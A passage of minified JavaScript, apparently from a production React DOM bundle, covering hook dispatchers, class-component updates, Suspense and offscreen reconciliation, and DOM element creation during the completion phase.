hs={readContext:Ue,useCallback:pe,useContext:pe,useEffect:pe,useImperativeHandle:pe,useInsertionEffect:pe,useLayoutEffect:pe,useMemo:pe,useReducer:pe,useRef:pe,useState:pe,useDebugValue:pe,useDeferredValue:pe,useTransition:pe,useMutableSource:pe,useSyncExternalStore:pe,useId:pe,unstable_isNewReconciler:!1},t2={readContext:Ue,useCallback:function(e,n){return nn().memoizedState=[e,n===void 0?null:n],e},useContext:Ue,useEffect:Ec,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,kr(4194308,4,Um.bind(null,n,e),t)},useLayoutEffect:function(e,n){return kr(4194308,4,e,n)},useInsertionEffect:function(e,n){return kr(4,2,e,n)},useMemo:function(e,n){var t=nn();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var i=nn();return n=t!==void 0?t(n):n,i.memoizedState=i.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},i.queue=e,e=e.dispatch=e2.bind(null,Q,e),[i.memoizedState,e]},useRef:function(e){var n=nn();return e={current:e},n.memoizedState=e},useState:Ac,useDebugValue:Xl,useDeferredValue:function(e){return nn().memoizedState=e},useTransition:function(){var e=Ac(!1),n=e[0];return e=Zv.bind(null,e[1]),nn().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var i=Q,r=nn();if(G){if(t===void 0)throw Error(P(407));t=t()}else{if(t=n(),se===null)throw Error(P(349));ct&30||Im(i,n,t)}r.memoizedState=t;var s={value:t,getSnapshot:n};return r.queue=s,Ec(Om.bind(null,i,s,e),[e]),i.flags|=2048,_i(9,Mm.bind(null,i,s,t,n),void 0,null),t},useId:function(){var e=nn(),n=se.identifierPrefix;if(G){var t=fn,i=mn;t=(i&~(1<<32-$e(i)-1)).toString(32)+t,n=":"+n+"R"+t,t=Ui++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Yv++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},i2={readContext:Ue,useCallback:_m,useContext:Ue,useEffect:Gl,useImperativeHandle:Vm,useInsertionEffect:km,useLayoutEffect:jm,useMemo:Hm,useReducer:Ca,useRef:Fm,useState:function(){return Ca(Vi)},useDebugValue:Xl,useDeferredValue:function(e){var n=Ve();return zm(n,ne.memoizedState,e)},useTransition:function(){var e=Ca(Vi)[0],n=Ve().memoizedState;return[e,n]},useMutableSource:qm,useSyncExternalStore:Nm,useId:Gm,unstable_isNewReconciler:!1},r2={readContext:Ue,useCallback:_m,useContext:Ue,useEffect:Gl,useImperativeHandle:Vm,useInsertionEffect:km,useLayoutEffect:jm,useMemo:Hm,useReducer:Aa,useRef:Fm,useState:function(){return Aa(Vi)},useDebugValue:Xl,useDeferredValue:function(e){var n=Ve();return ne===null?n.memoizedState=e:zm(n,ne.memoizedState,e)},useTransition:function(){var e=Aa(Vi)[0],n=Ve().memoizedState;return[e,n]},useMutableSource:qm,useSyncExternalStore:Nm,useId:Gm,unstable_isNewReconciler:!1};function Ge(e,n){if(e&&e.defaultProps){n=W({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Co(e,n,t,i){n=e.memoizedState,t=t(i,n),t=t==null?n:W({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var Us={isMounted:function(e){return(e=e._reactInternals)?ft(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var i=ye(),r=Fn(e),s=hn(i,r);s.payload=n,t!=null&&(s.callback=t),n=wn(e,s,r),n!==null&&(Ke(n,e,r,i),Br(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var i=ye(),r=Fn(e),s=hn(i,r);s.tag=1,s.payload=n,t!=null&&(s.callback=t),n=wn(e,s,r),n!==null&&(Ke(n,e,r,i),Br(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ye(),i=Fn(e),r=hn(t,i);r.tag=2,n!=null&&(r.callback=n),n=wn(e,r,i),n!==null&&(Ke(n,e,i,t),Br(n,e,i))}};function Pc(e,n,t,i,r,s,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(i,s,a):n.prototype&&n.prototype.isPureReactComponent?!Oi(t,i)||!Oi(r,s):!0}function $m(e,n,t){var i=!1,r=Un,s=n.contextType;return typeof s=="object"&&s!==null?s=Ue(s):(r=Ee(n)?lt:he.current,i=n.contextTypes,s=(i=i!=null)?Vt(e,r):Un),n=new n(t,s),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=Us,e.stateNode=n,n._reactInternals=e,i&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=s),n}function Tc(e,n,t,i){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,i),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,i),n.state!==e&&Us.enqueueReplaceState(n,n.state,null)}function Ao(e,n,t,i){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},kl(e);var s=n.contextType;typeof s=="object"&&s!==null?r.context=Ue(s):(s=Ee(n)?lt:he.current,r.context=Vt(e,s)),r.state=e.memoizedState,s=n.getDerivedStateFromProps,typeof s=="function"&&(Co(e,n,s,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&Us.enqueueReplaceState(r,r.state,null),ps(e,t,r,i),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function Gt(e,n){try{var t="",i=n;do t+=Ig(i),i=i.return;while(i);var r=t}catch(s){r=`
Error generating stack: `+s.message+`
`+s.stack}return{value:e,source:n,stack:r,digest:null}}function Ea(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Eo(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var s2=typeof WeakMap=="function"?WeakMap:Map;function Km(e,n,t){t=hn(-1,t),t.tag=3,t.payload={element:null};var i=n.value;return t.callback=function(){vs||(vs=!0,Oo=i),Eo(e,n)},t}function Jm(e,n,t){t=hn(-1,t),t.tag=3;var i=e.type.getDerivedStateFromError;if(typeof i=="function"){var r=n.value;t.payload=function(){return i(r)},t.callback=function(){Eo(e,n)}}var s=e.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(t.callback=function(){Eo(e,n),typeof i!="function"&&(Bn===null?Bn=new Set([this]):Bn.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function Lc(e,n,t){var i=e.pingCache;if(i===null){i=e.pingCache=new s2;var r=new Set;i.set(n,r)}else r=i.get(n),r===void 0&&(r=new Set,i.set(n,r));r.has(t)||(r.add(t),e=x2.bind(null,e,n,t),n.then(e,e))}function Rc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function Dc(e,n,t,i,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=hn(-1,1),n.tag=2,wn(t,n,1))),t.lanes|=1),e)}var a2=bn.ReactCurrentOwner,Ce=!1;function ge(e,n,t,i){n.child=e===null?Tm(n,null,t,i):Ht(n,e.child,t,i)}function qc(e,n,t,i,r){t=t.render;var s=n.ref;return Ft(n,r),i=Hl(e,n,t,i,s,r),t=zl(),e!==null&&!Ce?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,xn(e,n,r)):(G&&t&&Nl(n),n.flags|=1,ge(e,n,i,r),n.child)}function Nc(e,n,t,i,r){if(e===null){var s=t.type;return typeof s=="function"&&!eu(s)&&s.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=s,Ym(e,n,s,i,r)):(e=_r(t.type,null,i,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(s=e.child,!(e.lanes&r)){var a=s.memoizedProps;if(t=t.compare,t=t!==null?t:Oi,t(a,i)&&e.ref===n.ref)return xn(e,n,r)}return n.flags|=1,e=kn(s,i),e.ref=n.ref,e.return=n,n.child=e}function Ym(e,n,t,i,r){if(e!==null){var s=e.memoizedProps;if(Oi(s,i)&&e.ref===n.ref)if(Ce=!1,n.pendingProps=i=s,(e.lanes&r)!==0)e.flags&131072&&(Ce=!0);else return n.lanes=e.lanes,xn(e,n,r)}return Po(e,n,t,i,r)}function Zm(e,n,t){var i=n.pendingProps,r=i.children,s=e!==null?e.memoizedState:null;if(i.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},V(Dt,Le),Le|=t;else{if(!(t&1073741824))return e=s!==null?s.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,V(Dt,Le),Le|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},i=s!==null?s.baseLanes:t,V(Dt,Le),Le|=i}else s!==null?(i=s.baseLanes|t,n.memoizedState=null):i=t,V(Dt,Le),Le|=i;return ge(e,n,r,t),n.child}function ef(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Po(e,n,t,i,r){var s=Ee(t)?lt:he.current;return s=Vt(n,s),Ft(n,r),t=Hl(e,n,t,i,s,r),i=zl(),e!==null&&!Ce?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,xn(e,n,r)):(G&&i&&Nl(n),n.flags|=1,ge(e,n,t,r),n.child)}function Ic(e,n,t,i,r){if(Ee(t)){var s=!0;os(n)}else s=!1;if(Ft(n,r),n.stateNode===null)jr(e,n),$m(n,t,i),Ao(n,t,i,r),i=!0;else if(e===null){var a=n.stateNode,o=n.memoizedProps;a.props=o;var l=a.context,u=t.contextType;typeof u=="object"&&u!==null?u=Ue(u):(u=Ee(t)?lt:he.current,u=Vt(n,u));var c=t.getDerivedStateFromProps,d=typeof c=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==i||l!==u)&&Tc(n,a,i,u),Tn=!1;var p=n.memoizedState;a.state=p,ps(n,i,a,r),l=n.memoizedState,o!==i||p!==l||Ae.current||Tn?(typeof c=="function"&&(Co(n,t,c,i),l=n.memoizedState),(o=Tn||Pc(n,t,o,i,p,l,u))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=i,n.memoizedState=l),a.props=i,a.state=l,a.context=u,i=o):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),i=!1)}else{a=n.stateNode,Rm(e,n),o=n.memoizedProps,u=n.type===n.elementType?o:Ge(n.type,o),a.props=u,d=n.pendingProps,p=a.context,l=t.contextType,typeof l=="object"&&l!==null?l=Ue(l):(l=Ee(t)?lt:he.current,l=Vt(n,l));var g=t.getDerivedStateFromProps;(c=typeof g=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==d||p!==l)&&Tc(n,a,i,l),Tn=!1,p=n.memoizedState,a.state=p,ps(n,i,a,r);var v=n.memoizedState;o!==d||p!==v||Ae.current||Tn?(typeof g=="function"&&(Co(n,t,g,i),v=n.memoizedState),(u=Tn||Pc(n,t,u,i,p,v,l)||!1)?(c||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(i,v,l),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(i,v,l)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||o===e.memoizedProps&&p===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===e.memoizedProps&&p===e.memoizedState||(n.flags|=1024),n.memoizedProps=i,n.memoizedState=v),a.props=i,a.state=v,a.context=l,i=u):(typeof a.componentDidUpdate!="function"||o===e.memoizedProps&&p===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===e.memoizedProps&&p===e.memoizedState||(n.flags|=1024),i=!1)}return To(e,n,t,i,s,r)}function To(e,n,t,i,r,s){ef(e,n);var a=(n.flags&128)!==0;if(!i&&!a)return r&&vc(n,t,!1),xn(e,n,s);i=n.stateNode,a2.current=n;var o=a&&typeof t.getDerivedStateFromError!="function"?null:i.render();return n.flags|=1,e!==null&&a?(n.child=Ht(n,e.child,null,s),n.child=Ht(n,null,o,s)):ge(e,n,o,s),n.memoizedState=i.state,r&&vc(n,t,!0),n.child}function nf(e){var n=e.stateNode;n.pendingContext?gc(e,n.pendingContext,n.pendingContext!==n.context):n.context&&gc(e,n.context,!1),jl(e,n.containerInfo)}function Mc(e,n,t,i,r){return _t(),Ml(r),n.flags|=256,ge(e,n,t,i),n.child}var Lo={dehydrated:null,treeContext:null,retryLane:0};function Ro(e){return{baseLanes:e,cachePool:null,transitions:null}}function tf(e,n,t){var i=n.pendingProps,r=X.current,s=!1,a=(n.flags&128)!==0,o;if((o=a)||(o=e!==null&&e.memoizedState===null?!1:(r&2)!==0),o?(s=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),V(X,r&1),e===null)return So(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=i.children,e=i.fallback,s?(i=n.mode,s=n.child,a={mode:"hidden",children:a},!(i&1)&&s!==null?(s.childLanes=0,s.pendingProps=a):s=Hs(a,i,0,null),e=rt(e,i,t,null),s.return=n,e.return=n,s.sibling=e,n.child=s,n.child.memoizedState=Ro(t),n.memoizedState=Lo,e):Ql(n,a));if(r=e.memoizedState,r!==null&&(o=r.dehydrated,o!==null))return o2(e,n,a,i,o,r,t);if(s){s=i.fallback,a=n.mode,r=e.child,o=r.sibling;var l={mode:"hidden",children:i.children};return!(a&1)&&n.child!==r?(i=n.child,i.childLanes=0,i.pendingProps=l,n.deletions=null):(i=kn(r,l),i.subtreeFlags=r.subtreeFlags&14680064),o!==null?s=kn(o,s):(s=rt(s,a,t,null),s.flags|=2),s.return=n,i.return=n,i.sibling=s,n.child=i,i=s,s=n.child,a=e.child.memoizedState,a=a===null?Ro(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},s.memoizedState=a,s.childLanes=e.childLanes&~t,n.memoizedState=Lo,i}return s=e.child,e=s.sibling,i=kn(s,{mode:"visible",children:i.children}),!(n.mode&1)&&(i.lanes=t),i.return=n,i.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=i,n.memoizedState=null,i}function Ql(e,n){return n=Hs({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function Ar(e,n,t,i){return i!==null&&Ml(i),Ht(n,e.child,null,t),e=Ql(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function o2(e,n,t,i,r,s,a){if(t)return n.flags&256?(n.flags&=-257,i=Ea(Error(P(422))),Ar(e,n,a,i)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(s=i.fallback,r=n.mode,i=Hs({mode:"visible",children:i.children},r,0,null),s=rt(s,r,a,null),s.flags|=2,i.return=n,s.return=n,i.sibling=s,n.child=i,n.mode&1&&Ht(n,e.child,null,a),n.child.memoizedState=Ro(a),n.memoizedState=Lo,s);if(!(n.mode&1))return Ar(e,n,a,null);if(r.data==="$!"){if(i=r.nextSibling&&r.nextSibling.dataset,i)var o=i.dgst;return i=o,s=Error(P(419)),i=Ea(s,i,void 0),Ar(e,n,a,i)}if(o=(a&e.childLanes)!==0,Ce||o){if(i=se,i!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(i.suspendedLanes|a)?0:r,r!==0&&r!==s.retryLane&&(s.retryLane=r,yn(e,r),Ke(i,e,r,-1))}return Zl(),i=Ea(Error(P(421))),Ar(e,n,a,i)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=S2.bind(null,e),r._reactRetry=n,null):(e=s.treeContext,Re=On(r.nextSibling),De=n,G=!0,Qe=null,e!==null&&(Oe[we++]=mn,Oe[we++]=fn,Oe[we++]=ut,mn=e.id,fn=e.overflow,ut=n),n=Ql(n,i.children),n.flags|=4096,n)}function Oc(e,n,t){e.lanes|=n;var i=e.alternate;i!==null&&(i.lanes|=n),bo(e.return,n,t)}function Pa(e,n,t,i,r){var s=e.memoizedState;s===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:i,tail:t,tailMode:r}:(s.isBackwards=n,s.rendering=null,s.renderingStartTime=0,s.last=i,s.tail=t,s.tailMode=r)}function rf(e,n,t){var i=n.pendingProps,r=i.revealOrder,s=i.tail;if(ge(e,n,i.children,t),i=X.current,i&2)i=i&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Oc(e,t,n);else if(e.tag===19)Oc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}i&=1}if(V(X,i),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&ms(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),Pa(n,!1,r,t,s);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&ms(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}Pa(n,!0,t,null,s);break;case"together":Pa(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function jr(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function xn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),dt|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(P(153));if(n.child!==null){for(e=n.child,t=kn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=kn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function l2(e,n,t){switch(n.tag){case 3:nf(n),_t();break;case 5:Dm(n);break;case 1:Ee(n.type)&&os(n);break;case 4:jl(n,n.stateNode.containerInfo);break;case 10:var i=n.type._context,r=n.memoizedProps.value;V(cs,i._currentValue),i._currentValue=r;break;case 13:if(i=n.memoizedState,i!==null)return i.dehydrated!==null?(V(X,X.current&1),n.flags|=128,null):t&n.child.childLanes?tf(e,n,t):(V(X,X.current&1),e=xn(e,n,t),e!==null?e.sibling:null);V(X,X.current&1);break;case 19:if(i=(t&n.childLanes)!==0,e.flags&128){if(i)return rf(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),V(X,X.current),i)break;return null;case 22:case 23:return n.lanes=0,Zm(e,n,t)}return xn(e,n,t)}var sf,Do,af,of;sf=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Do=function(){};af=function(e,n,t,i){var r=e.memoizedProps;if(r!==i){e=n.stateNode,et(on.current);var s=null;switch(t){case"input":r=Ka(e,r),i=Ka(e,i),s=[];break;case"select":r=W({},r,{value:void 0}),i=W({},i,{value:void 0}),s=[];break;case"textarea":r=Za(e,r),i=Za(e,i),s=[];break;default:typeof r.onClick!="function"&&typeof i.onClick=="function"&&(e.onclick=ss)}no(t,i);var a;t=null;for(u in r)if(!i.hasOwnProperty(u)&&r.hasOwnProperty(u)&&r[u]!=null)if(u==="style"){var o=r[u];for(a in o)o.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(Li.hasOwnProperty(u)?s||(s=[]):(s=s||[]).push(u,null));for(u in i){var l=i[u];if(o=r!=null?r[u]:void 0,i.hasOwnProperty(u)&&l!==o&&(l!=null||o!=null))if(u==="style")if(o){for(a in o)!o.hasOwnProperty(a)||l&&l.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in l)l.hasOwnProperty(a)&&o[a]!==l[a]&&(t||(t={}),t[a]=l[a])}else t||(s||(s=[]),s.push(u,t)),t=l;else u==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,o=o?o.__html:void 0,l!=null&&o!==l&&(s=s||[]).push(u,l)):u==="children"?typeof l!="string"&&typeof l!="number"||(s=s||[]).push(u,""+l):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(Li.hasOwnProperty(u)?(l!=null&&u==="onScroll"&&_("scroll",e),s||o===l||(s=[])):(s=s||[]).push(u,l))}t&&(s=s||[]).push("style",t);var u=s;(n.updateQueue=u)&&(n.flags|=4)}};of=function(e,n,t,i){t!==i&&(n.flags|=4)};function ai(e,n){if(!G)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var i=null;t!==null;)t.alternate!==null&&(i=t),t=t.sibling;i===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:i.sibling=null}}function me(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,i=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,i|=r.subtreeFlags&14680064,i|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,i|=r.subtreeFlags,i|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=i,e.childLanes=t,n}function u2(e,n,t){var i=n.pendingProps;switch(Il(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return me(n),null;case 1:return Ee(n.type)&&as(),me(n),null;case 3:return i=n.stateNode,zt(),H(Ae),H(he),Vl(),i.pendingContext&&(i.context=i.pendingContext,i.pendingContext=null),(e===null||e.child===null)&&(br(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Qe!==null&&(Fo(Qe),Qe=null))),Do(e,n),me(n),null;case 5:Ul(n);var r=et(ji.current);if(t=n.type,e!==null&&n.stateNode!=null)af(e,n,t,i,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!i){if(n.stateNode===null)throw Error(P(166));return me(n),null}if(e=et(on.current),br(n)){i=n.stateNode,t=n.type;var s=n.memoizedProps;switch(i[sn]=n,i[Fi]=s,e=(n.mode&1)!==0,t){case"dialog":_("cancel",i),_("close",i);break;case"iframe":case"object":case"embed":_("load",i);break;case"video":case"audio":for(r=0;r<mi.length;r++)_(mi[r],i);break;case"source":_("error",i);break;case"img":case"image":case"link":_("error",i),_("load",i);break;case"details":_("toggle",i);break;case"input":Hu(i,s),_("invalid",i);break;case"select":i._wrapperState={wasMultiple:!!s.multiple},_("invalid",i);break;case"textarea":Gu(i,s),_("invalid",i)}no(t,s),r=null;for(var a in s)if(s.hasOwnProperty(a)){var o=s[a];a==="children"?typeof o=="string"?i.textContent!==o&&(s.suppressHydrationWarning!==!0&&Sr(i.textContent,o,e),r=["children",o]):typeof o=="number"&&i.textContent!==""+o&&(s.suppressHydrationWarning!==!0&&Sr(i.textContent,o,e),r=["children",""+o]):Li.hasOwnProperty(a)&&o!=null&&a==="onScroll"&&_("scroll",i)}switch(t){case"input":pr(i),zu(i,s,!0);break;case"textarea":pr(i),Xu(i);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(i.onclick=ss)}i=r,n.updateQueue=i,i!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Op(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof i.is=="string"?e=a.createElement(t,{is:i.is}):(e=a.createElement(t),t==="select"&&(a=e,i.multiple?a.multiple=!0:i.size&&(a.size=i.size))):e=a.createElementNS(e,t),e[sn]=n,e[Fi]=i,sf(e,n,!1,!1),n.stateNode=e;e:{switch(a=to(t,i),t){case"dialog":_("cancel",e),_("close",e),r=i;break;case"iframe":case"object":case"embed":_("load",e),r=i;break;case"video":case"audio":for(r=0;r<mi.length;r++)_(mi[r],e);r=i;break;case"source":_("error",e),r=i;break;case"img":case"image":case"link":_("error",e),_("load",e),r=i;break;case"details":_("toggle",e),r=i;break;case"input":Hu(e,i),r=Ka(e,i),_("invalid",e);break;case"option":r=i;break;case"select":e._wrapperState={wasMultiple:!!i.multiple},r=W({},i,{value:void 0}),_("invalid",e);break;case"textarea":Gu(e,i),r=Za(e,i),_("invalid",e);break;default:r=i}no(t,r),o=r;for(s in o)if(o.hasOwnProperty(s)){var l=o[s];s==="style"?Fp(e,l):s==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&wp(e,l)):s==="children"?typeof l=="string"?(t!=="textarea"||l!=="")&&Ri(e,l):typeof l=="number"&&Ri(e,""+l):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(Li.hasOwnProperty(s)?l!=null&&s==="onScroll"&&_("scroll",e):l!=null&&vl(e,s,l,a))}switch(t){case"input":pr(e),zu(e,i,!1);break;case"textarea":pr(e),Xu(e);break;case"option":i.value!=null&&e.setAttribute("value",""+jn(i.value));break;case"select":e.multiple=!!i.multiple,s=i.value,s!=null?Mt(e,!!i.multiple,s,!1):i.defaultValue!=null&&Mt(e,!!i.multiple,i.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=ss)}switch(t){case"button":case"input":case"select":case"textarea":i=!!i.autoFocus;break e;case"img":i=!0;break e;default:i=!1}}i&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return me(n),null;case 6:if(e&&n.stateNode!=null)of(e,n,e.memoizedProps,i);else{if(typeof i!="string"&&n.stateNode===null)throw Error(P(166));if(t=et(ji.current),et(on.current),br(n)){if(i=n.stateNode,t=n.memoizedProps,i[sn]=n,(s=i.nodeValue!==t)&&(e=De,e!==null))switch(e.tag){case 3:Sr(i.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Sr(i.nodeValue,t,(e.mode&1)!==0)}s&&(n.flags|=4)}else i=(t.nodeType===9?t:t.ownerDocument).createTextNode(i),i[sn]=n,n.stateNode=i}return me(n),null;case 13:if(H(X),i=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(G&&Re!==null&&n.mode&1&&!(n.flags&128))Em(),_t(),n.flags|=98560,s=!1;else if(s=br(n),i!==null&&i.dehydrated!==null){if(e===null){if(!s)throw Error(P(318));if(s=n.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(P(317));s[sn]=n}else _t(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;me(n),s=!1}else Qe!==null&&(Fo(Qe),Qe=null),s=!0;if(!s)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(i=i!==null,i!==(e!==null&&e.memoizedState!==null)&&i&&(n.child.flags|=8192,n.mode&1&&(e===null||X.current&1?te===0&&(te=3):Zl())),n.updateQueue!==null&&(n.flags|=4),me(n),null);case 4:return zt(),Do(e,n),e===null&&wi(n.stateNode.containerInfo),me(n),null;case 10:return Bl(n.type._context),me(n),null;case 17:return Ee(n.type)&&as(),me(n),null;case 19:if(H(X),s=n.memoizedState,s===null)return 